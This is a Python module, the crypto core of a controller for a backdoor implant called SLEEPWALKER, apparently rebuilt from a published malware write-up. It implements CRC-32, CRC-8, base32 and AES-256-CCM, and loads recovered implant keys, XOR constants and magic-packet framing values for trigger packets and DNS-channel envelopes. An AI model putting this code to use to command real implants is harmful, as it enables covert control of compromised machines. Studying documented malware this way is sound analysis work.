"""Core crypto + primitives for the SLEEPWALKER controller.

Pure Python, dependency-free.  Mirrors the C implementation in src/ exactly
so envelopes built here are byte-identical to the implant's and verify
against the vectors published in the SLEEPWALKER write-up.
"""

from __future__ import annotations

from ._cfg import load as _load_cfg

# Active key config (config.json; unmodified values fall back to the
# built-in defaults, which are the values recovered by the author of the
# write-up and mirrored in include/sw_core.h).
_cfg = _load_cfg()
AES_KEY = _cfg["aes_key"]
CONFIG_NONCE = _cfg["config_nonce"]  # 12 bytes

# CRON_SCHEDULE nested-program XOR key (default 0x90FDFD02).
CRON_XOR_KEY = _cfg["cron_xor_key"]


def cron_xor(data: bytes) -> bytes:
    """XOR a byte string with the repeating CRON_SCHEDULE key."""
    k = CRON_XOR_KEY
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))

# Envelope layouts.
NONCE_LEN, TAG_LEN = 12, 16
DNS_NONCE_LEN, DNS_TAG_LEN = 7, 4

# Trigger-packet framing.
SNIFF_MIN_PACKET = 48
SNIFF_XOR_CONST = _cfg["sniff_xor_const"]
MAGIC_MIN_BLOCK = 0x1C
MAGIC_MAX_BLOCK = 2048

# --------------------------------------------------------------------------
# CRC-32 (reflected, poly 0xEDB88320) with an explicit seed, no final XOR.
# seed=0 matches sw_crc32(..., 0) used by the magic-packet framing.
# --------------------------------------------------------------------------
_CRC32_TAB = []
for _i in range(256):
    _c = _i
    for _ in range(8):
        _c = (0xEDB88320 ^ (_c >> 1)) if (_c & 1) else (_c >> 1)
    _CRC32_TAB.append(_c)


def crc32(data: bytes, seed: int = 0) -> int:
    c = seed & 0xFFFFFFFF
    for b in data:
        c = _CRC32_TAB[(c ^ b) & 0xFF] ^ (c >> 8)
    return c & 0xFFFFFFFF


# --------------------------------------------------------------------------
# CRC-8, poly 0x31, MSB-first, seed 0, no final XOR (DNS label markers).
# --------------------------------------------------------------------------
_CRC8_TAB = []
for _i in range(256):
    _c = _i
    for _ in range(8):
        _c = ((_c << 1) ^ 0x31) & 0xFF if (_c & 0x80) else (_c << 1) & 0xFF
    _CRC8_TAB.append(_c)


def crc8(data: bytes) -> int:
    c = 0
    for b in data:
        c = _CRC8_TAB[c ^ b]
    return c


# --------------------------------------------------------------------------
# Base32 (RFC 4648, lowercase alphabet, no padding).
# --------------------------------------------------------------------------
_B32 = "abcdefghijklmnopqrstuvwxyz234567"


def base32_encode(data: bytes) -> str:
    out = []
    buf = 0
    bits = 0
    for b in data:
        buf = (buf << 8) | b
        bits += 8
        while bits >= 5:
            bits -= 5
            out.append(_B32[(buf >> bits) & 0x1F])
    if bits:
        out.append(_B32[(buf << (5 - bits)) & 0x1F])
    return "".join(out)


def base32_decode(text: str) -> bytes:
    val = 0
    bits = 0
    out = bytearray()
    for ch in text:
        idx = _B32.find(ch)
        if idx < 0:
            raise ValueError(f"invalid base32 char: {ch!r}")
        val = (val << 5) | idx
        bits += 5
        if bits >= 8:
            bits -= 8
            out.append((val >> bits) & 0xFF)
    return bytes(out)


# --------------------------------------------------------------------------
# AES-256 block cipher + CCM (SP 800-38C).  Verified against FIPS-197 C.3 and
# the DNS vector from the write-up.
# --------------------------------------------------------------------------
_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76"
    "ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d83115"
    "04c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f84"
    "53d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa8"
    "51a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d1973"
    "60814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479"
    "e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a"
    "703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df"
    "8ca1890dbfe6426841992d0fb054bb16"
)
_RCON = bytes.fromhex("01020408102040801b366cd8ab4d")


def _rotw(x: int) -> int:
    return ((x << 8) | (x >> 24)) & 0xFFFFFFFF


def _subw(x: int) -> int:
    return (
        (_SBOX[(x >> 24) & 0xFF] << 24)
        | (_SBOX[(x >> 16) & 0xFF] << 16)
        | (_SBOX[(x >> 8) & 0xFF] << 8)
        | _SBOX[x & 0xFF]
    )


def _key_schedule(key: bytes):
    w = [int.from_bytes(key[4 * i:4 * i + 4], "big") for i in range(8)]
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = _subw(_rotw(t)) ^ (_RCON[i // 8 - 1] << 24)
        elif i % 8 == 4:
            t = _subw(t)
        w.append((w[i - 8] ^ t) & 0xFFFFFFFF)
    return w


def _xtime(a: int) -> int:
    return ((a << 1) ^ (0x1B if a & 0x80 else 0)) & 0xFF


def _mul3(a: int) -> int:
    return _xtime(a) ^ a


def aes256_block(key: bytes, block: bytes) -> bytes:
    """Single-block AES-256 encryption of a 16-byte input."""
    w = _key_schedule(key)
    st = [[block[4 * c + r] for c in range(4)] for r in range(4)]

    def add_round_key(rnd: int) -> None:
        for c in range(4):
            wk = w[rnd * 4 + c]
            for r in range(4):
                st[r][c] ^= (wk >> (24 - 8 * r)) & 0xFF

    add_round_key(0)
    for rnd in range(1, 15):
        for c in range(4):
            for r in range(4):
                st[r][c] = _SBOX[st[r][c]]
        for r in range(1, 4):
            row = [st[r][c] for c in range(4)]
            for c in range(4):
                st[r][c] = row[(c + r) % 4]
        if rnd != 14:
            for c in range(4):
                a0, a1, a2, a3 = st[0][c], st[1][c], st[2][c], st[3][c]
                st[0][c] = _xtime(a0) ^ _mul3(a1) ^ a2 ^ a3
                st[1][c] = a0 ^ _xtime(a1) ^ _mul3(a2) ^ a3
                st[2][c] = a0 ^ a1 ^ _xtime(a2) ^ _mul3(a3)
                st[3][c] = _mul3(a0) ^ a1 ^ a2 ^ _xtime(a3)
        add_round_key(rnd)
    return bytes(st[r][c] for c in range(4) for r in range(4))


def _ccm_block_format(nonce: bytes, value: int, flags: int) -> bytes:
    nonce_len = len(nonce)
    L = 15 - nonce_len
    out = bytearray(16)
    out[0] = flags
    out[1:1 + nonce_len] = nonce
    for i in range(L):
        out[1 + nonce_len + i] = (value >> (8 * (L - 1 - i))) & 0xFF
    return bytes(out)


def _ccm_incr(ctr: bytearray, L: int) -> None:
    for i in range(15, 15 - L, -1):
        ctr[i] = (ctr[i] + 1) & 0xFF
        if ctr[i] != 0:
            break


def _cbc_mac(nonce: bytes, msg: bytes, tag_len: int,
             key: bytes | None = None) -> bytes:
    k = AES_KEY if key is None else key
    L = 15 - len(nonce)
    flags = (L - 1) | (((tag_len - 2) // 2) << 3)
    b0 = _ccm_block_format(nonce, len(msg), flags)
    x = aes256_block(k, b0)
    for off in range(0, len(msg), 16):
        blk = bytearray(msg[off:off + 16])
        blk.extend(b"\x00" * (16 - len(blk)))
        for i in range(16):
            blk[i] ^= x[i]
        x = aes256_block(k, bytes(blk))
    return x


def ccm_seal(nonce: bytes, plaintext: bytes, tag_len: int,
             key: bytes | None = None) -> tuple[bytes, bytes]:
    """Encrypt+authenticate with AES-256-CCM.  Returns (ciphertext, tag)."""
    k = AES_KEY if key is None else key
    L = 15 - len(nonce)
    mac = _cbc_mac(nonce, plaintext, tag_len, k)
    a0 = _ccm_block_format(nonce, 0, L - 1)
    s0 = aes256_block(k, a0)
    ctr = bytearray(a0)
    _ccm_incr(ctr, L)
    ct = bytearray()
    for off in range(0, len(plaintext), 16):
        s = aes256_block(k, bytes(ctr))
        chunk = plaintext[off:off + 16]
        ct.extend((chunk[i] ^ s[i]) for i in range(len(chunk)))
        _ccm_incr(ctr, L)
    tag = bytes((s0[i] ^ mac[i]) & 0xFF for i in range(tag_len))
    return bytes(ct), tag


def ccm_open(nonce: bytes, ciphertext: bytes, tag: bytes,
             key: bytes | None = None) -> bytes:
    """Decrypt+verify AES-256-CCM.  Raises ValueError if the tag is bad."""
    k = AES_KEY if key is None else key
    tag_len = len(tag)
    L = 15 - len(nonce)
    a0 = _ccm_block_format(nonce, 0, L - 1)
    s0 = aes256_block(k, a0)
    ctr = bytearray(a0)
    _ccm_incr(ctr, L)
    pt = bytearray()
    for off in range(0, len(ciphertext), 16):
        s = aes256_block(k, bytes(ctr))
        chunk = ciphertext[off:off + 16]
        pt.extend((chunk[i] ^ s[i]) for i in range(len(chunk)))
        _ccm_incr(ctr, L)
    mac = _cbc_mac(nonce, bytes(pt), tag_len, k)
    expect = bytes((s0[i] ^ mac[i]) & 0xFF for i in range(tag_len))
    if expect != tag:
        raise ValueError("CCM authentication tag mismatch")
    return bytes(pt)
